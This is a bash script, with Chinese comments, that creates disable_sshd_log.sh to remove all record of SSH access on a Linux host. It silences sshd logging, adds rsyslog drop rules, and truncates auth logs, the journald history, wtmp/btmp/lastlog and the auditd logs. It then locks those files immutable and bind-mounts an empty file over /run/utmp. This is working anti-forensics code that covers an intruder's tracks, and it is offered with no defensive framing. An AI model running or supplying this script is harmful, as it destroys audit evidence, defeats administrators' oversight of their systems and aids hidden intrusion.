cat << 'EOF' > disable_sshd_log.sh
#!/bin/bash

if [ "$EUID" -ne 0 ]; then
  echo "❌ 错误：请使用 root 权限运行此脚本 (例如: sudo bash $0)"
  exit 1
fi

echo "=== 开始全通道禁用并清理 SSH 登录及审计日志 ==="

# 识别服务名
if systemctl list-unit-files | grep -q "^sshd.service"; then
  SSH_SERVICE="sshd"
else
  SSH_SERVICE="ssh"
fi

# 1. 配置 sshd_config 为 QUIET
BACKUP_FILE="/etc/ssh/sshd_config.bak.$(date +%F_%H%M%S)"
cp /etc/ssh/sshd_config "$BACKUP_FILE"
if grep -qE "^#*LogLevel" /etc/ssh/sshd_config; then
  sed -i 's/^#*LogLevel.*/LogLevel QUIET/' /etc/ssh/sshd_config
else
  echo "LogLevel QUIET" >> /etc/ssh/sshd_config
fi

if ! sshd -t; then
  echo "❌ sshd 配置校验失败，已还原备份"
  cp "$BACKUP_FILE" /etc/ssh/sshd_config
  exit 1
fi
echo "[1/6] 已设置 sshd LogLevel 为 QUIET"
echo

# 2. 拦截 rsyslog 写入 secure / auth.log
if [ -d /etc/rsyslog.d ]; then
  cat << 'RSYSLOG_EOF' > /etc/rsyslog.d/00-drop-sshd.conf
:programname, isequal, "sshd" stop
if ($syslogfacility-text == 'auth' or $syslogfacility-text == 'authpriv') and ($msg contains 'sshd' or $msg contains 'pam_unix') then stop
RSYSLOG_EOF
  systemctl restart rsyslog 2>/dev/null
fi
[ -f /var/log/secure ] && truncate -s 0 /var/log/secure
[ -f /var/log/auth.log ] && truncate -s 0 /var/log/auth.log
echo "[2/6] 已拦截并清空传统文本认证日志"
echo

# 3. 禁用 systemd-journald 新日志，并彻底清除历史 journal 归档
SYSTEMD_DIR="/etc/systemd/system/${SSH_SERVICE}.service.d"
mkdir -p "$SYSTEMD_DIR"
cat << 'SYSTEMD_EOF' > "${SYSTEMD_DIR}/nolog.conf"
[Service]
LogLevelMax=0
StandardOutput=null
StandardError=null
SYSTEMD_EOF

systemctl daemon-reload
systemctl restart "$SSH_SERVICE"

# 轮转并清空所有历史 journald 日志（使 journalctl -u sshd 变为空）
journalctl --rotate
journalctl --vacuum-time=1s >/dev/null 2>&1
echo "[3/6] 已阻断并清空 systemd-journald 历史记录"
echo

# 4. 清空并屏蔽 wtmp / btmp / lastlog（针对 last 和 lastb）
for bin_log in /var/log/wtmp /var/log/btmp /var/log/lastlog; do
  if [ -f "$bin_log" ]; then
    chattr -i "$bin_log" 2>/dev/null
    truncate -s 0 "$bin_log"
    # 锁定文件防止 PAM 继续写入登录记录（部分系统可能触发认证警告，如遇异常可 chattr -i 解除）
    chattr +i "$bin_log" 2>/dev/null
  fi
done
echo "[4/6] 已清空并锁定 wtmp / btmp / lastlog（last 与 lastb 将为空）"
echo

# 5. 停止并禁用 auditd 内核审计日志（针对 ausearch）
if command -v auditctl >/dev/null 2>&1 || systemctl list-unit-files | grep -q "^auditd.service"; then
  # auditd 默认禁止直接用 systemctl stop，需通过 service 命令停止
  service auditd stop 2>/dev/null || systemctl stop auditd 2>/dev/null
  systemctl disable auditd 2>/dev/null
  # 清空现有审计日志文件
  if [ -d /var/log/audit ]; then
    find /var/log/audit -type f -exec truncate -s 0 {} +
  fi
  echo "[5/6] 已停止 auditd 服务并清空 /var/log/audit 历史数据"
else
  echo "[5/6] 系统未安装 auditd，跳过审计配置"
fi
echo

# 6. 清空并屏蔽 utmp 登录记录
# 创建一个空的只读占位文件（位于支持 chattr 的磁盘分区上）
sudo touch /etc/empty_utmp
sudo chattr +i /etc/empty_utmp
# 先清空现有的内存 utmp
sudo truncate -s 0 /run/utmp
# 使用 bind mount 将只读空文件强行覆盖挂载到 /run/utmp 上
sudo mount --bind /etc/empty_utmp /run/utmp
echo "[6/6] 已清空 utmp 并挂载 empty_utmp 占位文件"
echo

echo "=== ✅ 全部清理与禁用操作已完成 ==="
EOF
